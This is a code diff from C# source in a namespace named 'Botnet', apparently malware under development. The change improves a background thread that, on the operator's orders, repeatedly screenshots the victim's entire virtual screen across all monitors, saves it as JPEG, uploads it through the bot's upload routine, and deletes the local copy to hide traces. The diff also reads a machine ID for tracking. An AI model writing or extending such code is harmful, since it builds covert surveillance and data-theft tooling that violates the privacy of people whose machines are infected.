@@ -51,7 +51,7 @@ namespace Botnet
             {
                 Console.WriteLine(e);
             }
-            
+
             if (Utility.GetMachineID() != "")
             {
                 machineID = Utility.GetMachineID();
@@ -352,18 +352,21 @@ namespace Botnet
                     Thread.CurrentThread.IsBackground = true;
                     while (orders.screenCapture)
                     {
-                        var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
-                                                       Screen.PrimaryScreen.Bounds.Height,
-                                                       PixelFormat.Format32bppArgb);
-                        var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
-                        gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
-                                                    Screen.PrimaryScreen.Bounds.Y,
-                                                    0,
-                                                    0,
-                                                    Screen.PrimaryScreen.Bounds.Size,
-                                                    CopyPixelOperation.SourceCopy);
-                        string screenFile = Utility.screensDir + DateTime.Now.ToString("yyyyMMdd-HHmmss") + ".png";
-                        bmpScreenshot.Save(screenFile, ImageFormat.Png);
+                        string screenFile = Utility.screensDir + DateTime.Now.ToString("yyyyMMdd-HHmmss") + ".jpg";
+
+                        int screenLeft = SystemInformation.VirtualScreen.Left;
+                        int screenTop = SystemInformation.VirtualScreen.Top;
+                        int screenWidth = SystemInformation.VirtualScreen.Width;
+                        int screenHeight = SystemInformation.VirtualScreen.Height;
+                        using (Bitmap bmp = new Bitmap(screenWidth, screenHeight))
+                        {
+                            using (Graphics g = Graphics.FromImage(bmp))
+                            {
+                                g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
+                            }
+                            bmp.Save(screenFile, ImageFormat.Jpeg);
+                        }
+
                         Utility.UploadFile(screenFile, Utility.UPLOAD_SCREEN);
                         File.Delete(screenFile);
                         Thread.Sleep(orders.screenCaptureInterval * 1000);
